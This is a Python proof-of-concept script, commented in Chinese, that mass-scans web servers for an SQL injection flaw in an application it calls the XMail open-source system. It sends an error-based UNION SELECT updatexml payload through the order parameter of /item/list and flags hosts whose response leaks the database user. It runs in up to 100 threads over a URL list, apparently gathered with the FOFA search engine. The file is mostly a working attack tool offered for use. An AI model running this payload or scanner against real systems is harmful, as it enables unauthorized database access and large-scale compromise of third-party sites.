# XMail开源系统SQL注入漏洞
# 导包
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错

# 指纹模块
def banner():
    banner = """
 __   ____  __       _ _     _____       _    _____             
 \ \ / /  \/  |     (_) |   / ____|     | |  / ____|            
  \ V /| \  / | __ _ _| |  | (___   __ _| | | |  __  __ _ _ __  
   > < | |\/| |/ _` | | |   \___ \ / _` | | | | |_ |/ _` | '_ \ 
  / . \| |  | | (_| | | |   ____) | (_| | | | |__| | (_| | |_) |
 /_/ \_\_|  |_|\__,_|_|_|  |_____/ \__, |_|  \_____|\__,_| .__/ 
                                      | |                | |    
                                      |_|                |_|    
                                    author:           guoguo12138
                                    version:          1.0.2
                                    For:              XMail开源系统sql注入漏洞 
"""
    print(banner)

# poc模块
def poc(target):
    url = target+"/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": "https://fofa.info",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
    }
    
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=10)
        if  "root@localhost" in res.text:
            print("[+]该站点存在sql注入漏洞,url:"+target)
            with open ('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
        else :
            print("[-]该站点不存在sql注入漏洞 ,url:"+target)
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
        
    except Exception as e:
        print("[!]连接出现问题，请手动进行测试该站点,url="+target)
        with open ('warning.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a testing tool")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()